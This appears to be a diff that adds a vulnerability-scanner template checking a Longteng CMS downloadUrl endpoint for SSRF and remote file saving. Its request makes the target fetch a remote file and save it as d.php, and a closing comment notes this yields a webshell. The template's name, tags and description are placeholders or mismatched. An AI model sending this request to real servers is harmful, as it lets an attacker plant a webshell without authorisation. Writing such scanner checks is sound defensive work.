@@ -1,0 +1,22 @@
+id: ltcms-downloadUrl-ssrf
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 龙腾-CMS-PermissionAC
+  reference:
+    - http://kpanda.wiki/#/../Vulnhub/L20-1%E9%BE%99%E8%85%BE-CMS-SSRF
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/file/downloadUrl?file=http://{{interactsh-url}}/1.php&savePath=d.php"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+#webshell：http://ip/d.php 
